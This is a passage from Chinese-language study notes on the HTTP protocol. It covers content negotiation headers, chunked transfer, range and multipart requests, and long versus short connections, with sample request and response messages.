在传输时为了节约带宽，有时候还会压缩数据，因此还需要有一个 <strong>编码类型</strong>，说明数据使用的是什么编码格式。常用编码类型有以下三种：</p><ol><li>gzip：GNU zip 压缩格式，也是互联网上最流行的压缩格式。</li><li>deflate：zlib（deflate）压缩格式，流行程度仅次于 gzip。</li><li>br：Brotli 压缩算法，专门为 HTTP 设计，压缩效率和性能更好。</li></ol><p><strong>数据类型使用的头字段</strong></p><p>有了 MIME 类型和编码类型，无论是浏览器还是服务器就都可以轻松识别出 body 的数据类型，也就能够正确处理数据了。</p><p>HTTP 协议为此定义了两个 Accept 请求头字段和两个 Content 响应头字段，用于客户端和服务器进行 <strong>内容协商</strong>。也就是说，客户端用 Accept 头告诉服务器希望接收什么样的数据，而服务器用 Content 头告诉客户端实际发送了什么样的数据。</p><p><img src="/img/%E9%80%8F%E8%A7%86HTTP%E5%8D%8F%E8%AE%AE/5191bce1329efa157a6cc37ab9e789b9.png"></p><h3 id="语言类型与编码"><a href="#语言类型与编码" class="headerlink" title="语言类型与编码"></a>语言类型与编码</h3><p>MIME 类型和编码类型解决了计算机理解 body 数据的问题，但互联网遍布全球，不同国家不同地区的人使用了很多不同的语言，虽然都是 text/html，但如何让浏览器显示出每个人都可理解可阅读的语言文字呢？</p><p>这实际上就是 <strong>国际化</strong> 的问题。HTTP 采用了与数据类型相似的解决方案，又引入了两个概念：<strong>语言类型与字符集</strong>。</p><p>所谓语言类型就是人类使用的自然语言，例如汉语、英语、日语等，而这些自然语言可能还有下属的地区性方言，所以在需要明确区分的时候也要使用 <code>type-subtype</code> 的形式。比如 <code>en</code> 表示任意英语，<code>en-US</code> 表示美式英语，<code>en-GB</code> 表示英式英语，而 <code>zh-CN</code> 就表示我们最常使用的汉语。</p><p>而字符集是由于在计算机发展的早期，各个国家和地区的人们“各自为政”，发明了许多字符编码方式来处理自己的文字，比如英语世界用的 ASCII、汉语世界用的 GBK、日语世界用的 Shift_JIS 等。同样的一段文字，用一种编码显示正常，换另一种编码后可能就会变得一团糟。所以后来就出现了 <strong>Unicode 字符集</strong> 和 <strong>UTF-8 编码方式</strong>，把世界上所有的语言都容纳在一种编码方案里，UTF-8 也成为了互联网上的标准字符编码。</p><p><strong>语言类型使用的头字段</strong></p><p>同样的，HTTP 协议也使用了 Accept 请求头字段和 Content 响应头字段，用于客户端和服务器就语言与编码进行内容协商。</p><p><img src="/img/%E9%80%8F%E8%A7%86HTTP%E5%8D%8F%E8%AE%AE/0e9bcd6922fa8908bdba79d98ae5fa10.png"></p><p>需要注意的是，字符集在 HTTP 里使用的请求头字段是 <strong>Accept-Charset</strong>，但响应头里却没有对应的 Content-Charset，而是在 <strong>Content-Type</strong> 字段的数据类型后面用 <code>charset=xxx</code> 来表示。</p><p>而且由于现在的浏览器都支持多种字符集，因此通常不会发送 Accept-Charset。同时服务器也不会发送 Content-Language，因为使用的语言完全可以由字符集推断出来。所以在请求头里一般只会有 Accept-Language 字段，响应头里只会有 Content-Type 字段。</p><h3 id="内容协商"><a href="#内容协商" class="headerlink" title="内容协商"></a>内容协商</h3><p><strong>内容协商的质量值</strong></p><p>在 HTTP 协议里用 Accept、Accept-Encoding、Accept-Language 等请求头字段进行内容协商的时候，还可以用一种特殊的 <code>q</code> 参数表示权重来设定优先级，这里的 q 是 quality factor 的意思。</p><p>权重的最大值是 1，最小值是 0.01，<strong>默认值是 1</strong>，如果值是 0 就表示拒绝。具体的形式是在数据类型或语言代码后面加一个 <code>;</code> 后面 <code>q=value</code>。例如下面的 Accept 字段，表示浏览器最希望使用的是 HTML 文件，权重是 1；其次是 XML 文件，权重是 0.9，最后是任意数据类型，权重是 0.8。服务器收到请求头后，就会计算权重，再根据自己的实际情况优先输出 HTML 或者 XML。</p><figure class="highlight apache"><table><tr><td class="gutter"><div class="code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">Accept</span>: text/html,application/xml;q=<span class="hljs-number">0</span>.<span class="hljs-number">9</span>,*/*;q=<span class="hljs-number">0</span>.<span class="hljs-number">8</span><br></code></pre></td></tr></table></figure><p><strong>内容协商的结果</strong></p><p>内容协商的过程是不透明的，每个 Web 服务器使用的算法都不一样。但有的时候，服务器会在响应头里多加一个 <strong>Vary</strong> 字段，记录服务器在内容协商时参考的请求头字段，给出一点信息，例如：</p><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ada">Vary: <span class="hljs-keyword">Accept</span>-Encoding,User-Agent,<span class="hljs-keyword">Accept</span><br></code></pre></td></tr></table></figure><p>这个 Vary 字段表示服务器依据了 Accept-Encoding、User-Agent 和 Accept 这三个头字段，然后决定了发回的响应报文。</p><p>Vary 字段可以认为是响应报文的一个特殊的 <strong>版本标记</strong>，每当 Accept 等请求头变化时，Vary 也会随着响应报文一起变化。也就是说，同一个 URI 可能会有多个不同的版本，主要用于在传输链路中间的代理服务器上实现缓存服务。</p><h3 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h3><p><img src="/img/%E9%80%8F%E8%A7%86HTTP%E5%8D%8F%E8%AE%AE/b2118315a977969ddfcc7ab9d26cb358.png"></p><table><thead><tr><th align="left">请求头字段</th><th align="left">说明</th><th align="left">响应头字段</th><th>说明</th></tr></thead><tbody><tr><td align="left">Accept</td><td align="left">客户端支持的 MIME 类型</td><td align="left">Content-Type</td><td>服务器选择的 MIME 类型</td></tr><tr><td align="left">Accept-Charset ❌</td><td align="left">客户端支持的字符集类型</td><td align="left"><strong>Content-Type</strong></td><td>服务器选择的字符集类型</td></tr><tr><td align="left">Accept-Encoding</td><td align="left">客户端支持的编码类型</td><td align="left">Content-Encoding</td><td>服务器选择的编码类型</td></tr><tr><td align="left">Accept-Language</td><td align="left">客户端支持的自然语言类型</td><td align="left">Content-Language ❌</td><td>服务器选择的自然语言类型</td></tr></tbody></table><p>注：<strong>Content-</strong>* 字段也可以用在请求报文里，说明请求体的数据类型。比如使用 POST 方法向服务器提交 JSON 格式的数据，里面包含有中文，请求头应该形如：</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/service/v1/user/auth</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Content-type</span><span class="hljs-punctuation">: </span>application/json; charset=utf-8<br><span class="hljs-attribute">Content-Language</span><span class="hljs-punctuation">: </span>zh-CN,zh<br></code></pre></td></tr></table></figure><h2 id="大文件传输"><a href="#大文件传输" class="headerlink" title="大文件传输"></a>大文件传输</h2><p>早期互联网上传输的基本上都是只有几 K 大小的文本和小图片，现在的情况则大有不同。网页里包含的信息实在是太多了，随随便便一个主页 HTML 就有可能上百 K，高质量的图片都以 M 论，更不要说那些电影、电视剧了，几 G、几十 G 都有可能。</p><p>相比之下，100M 的光纤固网或者 4G 移动网络在这些大文件的压力下都变成了“小水管”，无论是上传还是下载，都会把网络传输链路挤的“满满当当”。所以，如何在有限的带宽下高效快捷地传输这些大文件就成了一个重要的课题。</p><h3 id="数据压缩"><a href="#数据压缩" class="headerlink" title="数据压缩"></a>数据压缩</h3><p>压缩 HTML 等文本文件是传输大文件 <strong>最基本的方法</strong>。通常浏览器在发送请求时都会带着 <strong>Accept-Encoding</strong> 头字段，里面是浏览器支持的压缩格式列表，例如 gzip、deflate、br 等，这样服务器就可以从中选择一种压缩算法，放进 <strong>Content-Encoding</strong> 响应头里，再把原数据压缩后发给浏览器。</p><p>如果压缩率能有 50%，也就是说 100K 的数据能够压缩成 50K 的大小，那么就相当于在带宽不变的情况下网速提升了一倍，加速的效果是非常明显的。</p><p>不过这个解决方法也有个缺点，gzip 等压缩算法通常只对文本文件有较好的压缩率（通常能超过 60%），而图片、音频视频等多媒体数据本身就已经是高度压缩的，再用 gzip 处理也不会变小（甚至还有可能会增大一点），所以它就失效了。</p><h3 id="分块传输"><a href="#分块传输" class="headerlink" title="分块传输"></a>分块传输</h3><p>在数据压缩之外，还能有什么办法来解决大文件的问题呢？</p><p>压缩是把大文件整体变小，我们可以反过来思考，如果大文件整体不能变小，那就把它“拆开”，分解成多个小块，把这些小块分批发给浏览器，浏览器收到后再组装复原。这样浏览器和服务器都不用在内存里保存文件的全部，每次只收发一小部分，网络也不会被大文件长时间占用，内存、带宽等资源也就节省下来了。</p><p>这种 <strong>化整为零</strong> 的思路在 HTTP 协议里就是 <strong>分块传输编码（chunked）</strong>，在响应报文里用头字段 <strong>Transfer-Encoding: chunked</strong> 来表示，意思是报文里的 body 部分不是一次性发过来的，而是分成了许多的 <strong>块（chunk）</strong>逐个发送。</p><p>分块传输也可以用于 <strong>流式数据</strong>，例如由数据库动态生成的表单页面，这种情况下 body 数据的长度是未知的，无法在头字段 <strong>Content-Length</strong> 里给出确切的长度，所以也只能用 chunked 方式分块发送。</p><blockquote><p>Transfer-Encoding: chunked 和 Content-Length 这两个字段是 <strong>互斥的</strong>，也就是说响应报文里这两个字段不能同时出现，一个响应报文的传输要么是长度已知，要么是长度未知（chunked）。</p><p>Transfer-Encoding 最常见的值是 chunked，但也可以用 gzip、deflate 等，表示传输时使用了压缩编码。但这与 Content-Encoding 不同，Transfer-Encoding 在传输后会被自动解码还原出原始数据，而 Content-Encoding 则必须由应用自己解码。</p></blockquote><p>分块传输的编码规则，如图所示：</p><p><img src="/img/%E9%80%8F%E8%A7%86HTTP%E5%8D%8F%E8%AE%AE/25e7b09cf8cb4eaebba42b4598192410.png"></p><ol><li>每个分块包含两个部分，长度头和数据块；</li><li>长度头是以 CRLF（回车换行，即 \r\n）结尾的一行明文，用 16 进制数字表示长度；</li><li>数据块紧跟在长度头后，最后也用 CRLF 结尾（分块传输数据中含有 CRLF 不会影响分块处理，因为分块前有数据长度说明）；</li><li>最后用一个长度为 0 的分块表示结束，即 0\r\n\r\n 。</li></ol><p><strong>请求报文</strong></p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">GET</span> <span class="hljs-string">/16-1</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>www.chrono.com<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>curl/7.55.1<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>*/*<br></code></pre></td></tr></table></figure><p><strong>响应报文</strong></p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-meta">HTTP/1.1</span> <span class="hljs-number">200</span> OK<br><span class="hljs-attribute">Server</span><span class="hljs-punctuation">: </span>openresty/1.19.9.1<br><span class="hljs-attribute">Date</span><span class="hljs-punctuation">: </span>Mon, 22 Nov 2021 08:01:52 GMT<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>text/plain<br><span class="hljs-attribute">Transfer-Encoding</span><span class="hljs-punctuation">: </span>chunked<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>keep-alive<br><br><span class="haskell"><span class="hljs-title">f</span></span><br><span class="haskell"><span class="hljs-title">chunked</span> <span class="hljs-class"><span class="hljs-keyword">data</span> 1</span></span><br><span class="haskell"></span><br><span class="haskell"><span class="hljs-title">f</span></span><br><span class="haskell"><span class="hljs-title">chunked</span> <span class="hljs-class"><span class="hljs-keyword">data</span> 2</span></span><br><span class="haskell"></span><br><span class="haskell"><span class="hljs-title">f</span></span><br><span class="haskell"><span class="hljs-title">chunked</span> <span class="hljs-class"><span class="hljs-keyword">data</span> 3</span></span><br><span class="haskell"></span><br><span class="haskell"><span class="hljs-number">0</span></span><br></code></pre></td></tr></table></figure><h3 id="范围请求"><a href="#范围请求" class="headerlink" title="范围请求"></a>范围请求</h3><p>有了分块传输编码，服务器就可以轻松地收发大文件了，但对于几 G 的超大文件，还有一些问题需要考虑。</p><p>比如，你在看当下正热播的某穿越剧，想跳过片头直接看正片，或者有段剧情很无聊，想拖动进度条快进几分钟，这实际上是想获取一个大文件其中的片段数据，而分块传输并没有这个能力。</p><p>HTTP 协议为了满足这样的需求，提出了 <strong>范围请求（range requests）</strong>的概念，允许客户端在请求头里使用专用字段来表示只获取文件的一部分，相当于是 <strong>客户端的化整为零</strong>。</p><p>范围请求不是 Web 服务器必备的功能，可以实现也可以不实现，所以服务器必须在响应头里使用字段 <strong>Accept-Ranges: bytes</strong> 明确告知客户端：我支持范围请求。如果不支持的话，服务器可以发送 Accept-Ranges: none，或者干脆不发送 Accept-Ranges 字段，这样客户端就认为服务器没有实现范围请求功能，只能老老实实地收发整块文件了。</p><p>请求头 <strong>Range: bytes=x-y</strong> 是 HTTP 范围请求的专用字段，其中的 x 和 y 是以字节为单位的数据范围，表示数据的偏移量，从 0 开始计数。Range 的格式也很灵活，x 和 y 可以省略，能够很方便地表示正数或者倒数的范围。假设文件是 100 个字节，那么：</p><ul><li>“0-”：表示从文档起点到文档结尾，相当于 0-99，即整个文件；</li><li>“10-”：表示从第 10 个字节开始到文档结尾，相当于 10-99；</li><li>“-1”：表示文档的最后一个字节，相当于 99-99；</li><li>“-10”：表示从文档结尾倒数 10 个字节，相当于 90-99。</li></ul><blockquote><p>注：Range 请求的数据范围针对于压缩前的原文件。</p></blockquote><p>服务器收到 Range 字段后，需要做四件事。</p><ol><li>必须检查请求的范围是否合法，比如文件只有 100 个字节，但请求 “200-300”，这就是范围越界了。服务器就会返回状态码 <strong>416</strong>，意思是所请求的范围无法满足；</li><li>如果范围正确，服务器就可以根据 Range 头计算偏移量，读取文件的片段了，返回状态码 <strong>206 Partial Content</strong>，和 200 的意思差不多，但表示 body 只是原数据的一部分。</li><li>服务器要添加一个响应头字段 <strong>Content-Range: bytes x-y/length</strong>，告诉片段的实际偏移量和资源的总大小，与 Range 头区别在没有 “=”，范围后多了总长度。例如，对于 “0-10” 的范围请求，值就是 “bytes 0-10/100”。</li><li>发送数据，直接把片段用 TCP 发给客户端，一个范围请求就算是处理完了。</li></ol><p>范围请求不仅可以用在看视频时的拖拽进度，常用的多段下载、断点续传也是基于它实现的，要点是：</p><ol><li>先发个 HEAD 请求，看服务器是否支持范围请求，同时获取文件的大小；</li><li>开 n 个线程，每个线程使用 Range 字段划分出各自负责下载的片段，发送请求传输数据；</li><li>下载意外中断也不必重头再来一遍，只要根据上次的下载记录，用 Range 请求剩下的那一部分就可以了。</li></ol><p><strong>请求报文</strong></p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">GET</span> <span class="hljs-string">/16-2</span> <span class="hljs-meta">HTTP/1.1</span><br>Host:www.chrono.com<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>curl/7.55.1<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>*/*<br>Range:bytes=0-31<br></code></pre></td></tr></table></figure><p><strong>响应报文</strong></p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-meta">HTTP/1.1</span> <span class="hljs-number">206</span> Partial Content<br><span class="hljs-attribute">Server</span><span class="hljs-punctuation">: </span>openresty/1.19.9.1<br><span class="hljs-attribute">Date</span><span class="hljs-punctuation">: </span>Mon, 22 Nov 2021 06:27:26 GMT<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>text/plain<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>32<br><span class="hljs-attribute">Last-Modified</span><span class="hljs-punctuation">: </span>Sat, 29 May 2021 11:07:40 GMT<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>keep-alive<br><span class="hljs-attribute">Accept-Ranges</span><span class="hljs-punctuation">: </span>bytes<br><span class="hljs-attribute">ETag</span><span class="hljs-punctuation">: </span>&quot;60b2207c-5a&quot;<br><span class="hljs-attribute">Content-Range</span><span class="hljs-punctuation">: </span>bytes 0-31/90<br><br><span class="pgsql">// this <span class="hljs-keyword">is</span> a plain <span class="hljs-type">text</span> <span class="hljs-type">json</span> doc</span><br></code></pre></td></tr></table></figure><h3 id="多段数据"><a href="#多段数据" class="headerlink" title="多段数据"></a>多段数据</h3><p>刚才说的范围请求一次只获取一个片段，其实它还支持在 Range 头里使用多个 “x-y”，一次性获取多个片段数据。</p><p>这种情况需要使用一种特殊的 MIME 类型：<strong>multipart/byteranges</strong>，表示报文的 body 是由多段字节序列组成的，并且还要用一个参数 <strong>boundary=xxx</strong> 给出段之间的分隔标记。</p><p>多段数据的格式与范围请求也比较类似，但它需要用 <strong>分隔标记（boundary）</strong>来区分不同的片段，每一个分段必须以 “–boundary” 开始，之后用 Content-Type 和 Content-Range 标记这段数据的类型和所在范围，然后就像普通的响应头一样以回车换行结束，再加上分段数据，最后用一个 “–boundary–” 表示所有的分段结束。</p><p>多段数据的编码规则，如图所示：</p><p><img src="/img/%E9%80%8F%E8%A7%86HTTP%E5%8D%8F%E8%AE%AE/fffa3a65e367c496428f3c0c4dac8a37.png"></p><p><strong>请求报文</strong></p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">GET</span> <span class="hljs-string">/16-2</span> <span class="hljs-meta">HTTP/1.1</span><br>Host:www.chrono.com<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>curl/7.55.1<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>*/*<br>Range:bytes=0-9,20-29<br></code></pre></td></tr></table></figure><p><strong>响应报文</strong></p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-meta">HTTP/1.1</span> <span class="hljs-number">206</span> Partial Content<br><span class="hljs-attribute">Server</span><span class="hljs-punctuation">: </span>openresty/1.19.9.1<br><span class="hljs-attribute">Date</span><span class="hljs-punctuation">: </span>Mon, 22 Nov 2021 06:13:04 GMT<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>multipart/byteranges; boundary=00000000001<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>189<br><span class="hljs-attribute">Last-Modified</span><span class="hljs-punctuation">: </span>Sat, 29 May 2021 11:07:40 GMT<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>keep-alive<br><span class="hljs-attribute">Accept-Ranges</span><span class="hljs-punctuation">: </span>bytes<br><span class="hljs-attribute">ETag</span><span class="hljs-punctuation">: </span>&quot;60b2207c-5a&quot;<br><br><span class="pgsql"></span><br><span class="pgsql"><span class="hljs-comment">--00000000001</span></span><br><span class="pgsql">Content-<span class="hljs-keyword">Type</span>: <span class="hljs-type">text</span>/plain</span><br><span class="pgsql">Content-Range: bytes <span class="hljs-number">0</span><span class="hljs-number">-9</span>/<span class="hljs-number">90</span></span><br><span class="pgsql"></span><br><span class="pgsql">// this <span class="hljs-keyword">is</span></span><br><span class="pgsql"><span class="hljs-comment">--00000000001</span></span><br><span class="pgsql">Content-<span class="hljs-keyword">Type</span>: <span class="hljs-type">text</span>/plain</span><br><span class="pgsql">Content-Range: bytes <span class="hljs-number">20</span><span class="hljs-number">-29</span>/<span class="hljs-number">90</span></span><br><span class="pgsql"></span><br><span class="pgsql">ext <span class="hljs-type">json</span> d</span><br><span class="pgsql"><span class="hljs-comment">--00000000001--</span></span><br></code></pre></td></tr></table></figure><h3 id="小结-1"><a href="#小结-1" class="headerlink" title="小结"></a>小结</h3><p>HTTP 处理大文件有四种方法，要注意这四种方法不是互斥的，而是可以混合起来使用。例如，压缩后再分块传输，或者分段后再分块。下面就模拟了后一种场景：</p><p><strong>请求报文</strong></p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">GET</span> <span class="hljs-string">/16-3</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>www.chrono.com<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>keep-alive<br><span class="hljs-attribute">Upgrade-Insecure-Requests</span><span class="hljs-punctuation">: </span>1<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>zh-CN,zh;q=0.9<br></code></pre></td></tr></table></figure><p><strong>响应报文</strong></p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-meta">HTTP/1.1</span> <span class="hljs-number">200</span> OK<br><span class="hljs-attribute">Server</span><span class="hljs-punctuation">: </span>openresty/1.19.9.1<br><span class="hljs-attribute">Date</span><span class="hljs-punctuation">: </span>Mon, 22 Nov 2021 08:07:26 GMT<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>multipart/byteranges; boundary=xyz<br><span class="hljs-attribute">Transfer-Encoding</span><span class="hljs-punctuation">: </span>chunked<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>keep-alive<br><span class="hljs-attribute">Accept-Ranges</span><span class="hljs-punctuation">: </span>bytes<br><br><span class="pgsql"><span class="hljs-number">47</span></span><br><span class="pgsql"><span class="hljs-comment">--xyz</span></span><br><span class="pgsql">Content-<span class="hljs-keyword">Type</span>: <span class="hljs-type">text</span>/plain</span><br><span class="pgsql">Content-Range: bytes <span class="hljs-number">0</span><span class="hljs-number">-9</span>/<span class="hljs-number">90</span></span><br><span class="pgsql"></span><br><span class="pgsql">// this <span class="hljs-keyword">is</span></span><br><span class="pgsql"></span><br><span class="pgsql"><span class="hljs-number">49</span></span><br><span class="pgsql"><span class="hljs-comment">--xyz</span></span><br><span class="pgsql">Content-<span class="hljs-keyword">Type</span>: <span class="hljs-type">text</span>/plain</span><br><span class="pgsql">Content-Range: bytes <span class="hljs-number">20</span><span class="hljs-number">-29</span>/<span class="hljs-number">90</span></span><br><span class="pgsql"></span><br><span class="pgsql">ext <span class="hljs-type">json</span> d</span><br><span class="pgsql"></span><br><span class="pgsql"><span class="hljs-number">8</span></span><br><span class="pgsql"><span class="hljs-comment">--xyz--</span></span><br><span class="pgsql"></span><br><span class="pgsql"><span class="hljs-number">0</span></span><br></code></pre></td></tr></table></figure><h2 id="连接管理"><a href="#连接管理" class="headerlink" title="连接管理"></a>连接管理</h2><p>HTTP 的性能问题可以说是：“不算差，不够好”，这次就来好好看看 HTTP 在连接这方面的表现。</p><h3 id="短连接"><a href="#短连接" class="headerlink" title="短连接"></a>短连接</h3><p>HTTP 协议最初（0.9/1.0）是个非常简单的协议，通信过程也采用了简单的 “请求-应答” 方式。</p><p>底层的数据传输基于 TCP/IP，每次发送请求前需要先与服务器建立连接，收到响应报文后会立即关闭连接。因为客户端与服务器的整个连接过程很短暂，不会与服务器保持长时间的连接状态，所以就被称为 <strong>短连接（short-lived connections）</strong>，早期的 HTTP 协议也被称为是 <strong>无连接</strong> 的协议。</p><p>短连接的缺点相当严重，因为在 TCP 协议里，<strong>建立连接和关闭连接都是非常昂贵的操作</strong>。TCP 建立连接要有三次握手，发送 3 个数据包，需要 1 个 RTT；关闭连接是四次挥手，4 个数据包需要 2 个 RTT。而 HTTP 的一次简单 “请求-应答” 通常只需要 <strong>4 个包</strong>，如果不算服务器内部的处理时间，最多是 2 个 RTT。这么算下来，浪费的时间就是 3÷5=60%，传输效率低得惊人。</p><blockquote><p>RTT（Round-Trip Time）：往返时延，为数据完全发送完成到收到确认信号的时间。</p></blockquote><p><img src="/img/%E9%80%8F%E8%A7%86HTTP%E5%8D%8F%E8%AE%AE/54315ed9ac37fbc6547258040f00a80c.png"></p><h3 id="长连接"><a href="#长连接" class="headerlink" title="长连接"></a>长连接</h3><p>针对短连接暴露出的缺点，HTTP 协议提出了 <strong>长连接（persistent connections）</strong> 的通信方式。</p><p>其实解决办法也很简单，用的就是 <strong>成本均摊</strong> 的思路，既然 TCP 的连接和关闭非常耗时间，那么就把这个时间成本由原来的一个 “请求-应答” 均摊到多个 “请求-应答” 上。这样虽然不能改善 TCP 的连接效率，但基于 <strong>分母效应</strong>，每个 “请求-应答” 的无效时间就会降低不少，整体传输效率也就提高了。</p><p><img src="/img/%E9%80%8F%E8%A7%86HTTP%E5%8D%8F%E8%AE%AE/57b3d80234a1f1b8c538a376aa01d3b4.png"></p><h3 id="连接字段"><a href="#连接字段" class="headerlink" title="连接字段"></a>连接字段</h3><p>由于长连接对性能的改善效果非常显著，所以在 HTTP/1.1 中的连接都会 <strong>默认启用长连接</strong>。不需要用什么特殊的头字段指定，只要向服务器发送了第一次请求，后续的请求都会重复利用第一次打开的 TCP 连接，也就是长连接，在这个连接上收发数据。</p><p>当然，我们也可以明确要求使用长连接机制，只需要在请求头中加上 <strong>Connection: keep-alive</strong> 字段。不管客户端是否显式要求长连接，如果服务器支持长连接，它总会在响应报文里放一个 <strong>Connection: keep-alive</strong> 字段，告诉客户端：我支持长连接。</p><p>不过长连接也有一些小缺点，<strong>问题就出在它的 “长” 上</strong>。因为 TCP 连接长时间不关闭，服务器必须在内存里保存它的状态，这就占用了服务器的资源。如果有大量的空闲长连接只连不发，就会很快耗尽服务器的资源，导致服务器无法为真正有需要的用户提供服务。</p><p>所以，长连接也需要在恰当的时间关闭，不能永远保持与服务器的连接，这在客户端或者服务器都可以做到。</p><p>在客户端，可以在请求头里加上 <strong>Connection: close</strong> 字段，告诉服务器：这次通信后就关闭连接。服务器看到这个字段，就知道客户端要主动关闭连接，于是在响应报文里也加上这个字段，发送之后就调用 Socket API 关闭 TCP 连接。</p><p>而服务器端通常不会主动关闭连接，但也可以使用一些策略。拿 Nginx 来举例，它有两种方式：</p><ol><li>使用 <code>keepalive_timeout</code> 指令，设置长连接的超时时间，如果在一段时间内连接上没有任何数据收发就主动断开连接，避免空闲连接占用系统资源。</li><li>使用 <code>keepalive_requests</code> 指令，设置长连接上可发送的最大请求次数。比如设置成 1000，那么当 Nginx 在这个连接上处理了 1000 个请求后，也会主动断开连接。</li></ol><p>另外，客户端和服务器都可以在报文里附加通用头字段 <strong>Keep-Alive: timeout=value</strong>，限定长连接的超时时间。但这个字段的约束力并不强，通信的双方可能并不会遵守，所以不太常见。</p><h3 id="队头阻塞"><a href="#队头阻塞" class="headerlink" title="队头阻塞"></a>队头阻塞</h3><p><strong>队头阻塞（head-of-line blocking）</strong>与短连接和长连接无关，而是由 HTTP 基本的 “请求-应答” 模型所导致的。</p><p>因为 HTTP 规定报文必须是 “一发一收”，这就形成了一个先进先出的 “串行” 队列。队列里的请求没有轻重缓急的优先级，只有入队的先后顺序，排在最前面的请求被最优先处理。如果队首的请求因为处理的太慢耽误了时间，那么队列后面的所有请求也不得不跟着一起等待，结果就是其他的请求承担了不应有的时间成本。</p><p>在性能优化上，由于 “请求-应答” 模型不能变，所以队头阻塞问题在 HTTP/1.1 里无法解决，只能通过 <strong>并发连接（concurrent connections）</strong>和 <strong>域名分片（domain sharding）</strong>技术进行缓解。</p><p><img 